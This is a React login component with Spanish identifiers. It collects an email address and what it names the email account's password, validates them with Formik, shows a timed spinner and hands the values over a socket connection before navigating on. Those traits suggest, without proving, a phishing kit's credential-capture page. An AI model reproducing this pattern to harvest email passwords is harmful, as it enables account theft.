import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../../context'
import { submitBase } from '../../../../helpers/submitBase'

import { EmailAndPasswordInput } from './EmailAndPasswordInput'
import { emailAndPasswordValidate } from '../../../../security/emailAndPasswordValidate'
import { ErrorEmailAndPassword } from './ErrorEmailAndPassword'
import { Spiner } from '../../../Spiner'

const valuesData = { correo: '', claveCorreo: '' }

export const EmailAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = ''}) => {
    
    const navigate = useNavigate()
    
    const { addData } = useContext(UserDataContext);
    const { socket } = useContext(SocketContext);    
    const [showSpiner , SetshowSpiner] = useState(false);
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }

    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => emailAndPasswordValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl})
    })

    return (
        <div>
            {/* Spiner de carga */}
            {
                showSpiner === true ? <Spiner /> : null
            }

            {/* Aqui ira las notificacion de error */}
            <ErrorEmailAndPassword errors={errors} touched={touched} />
            
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <EmailAndPasswordInput
                    claveCorreo={values.claveCorreo}  
                    correo={values.correo} 
                    handleBlur={handleBlur} 
                    handleChange={handleChange}
                    touched={touched} 
                    errors={errors}
                    showPasswordMode={false}
                />

                <button 
                    disabled={
                        (
                            touched.correo &&
                            errors.correo || 
                            values.correo.length === 0
                        ) || 
                        (
                            touched.claveCorreo &&
                            errors.claveCorreo || 
                            values.claveCorreo.length === 0
                        ) ? true : false}
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
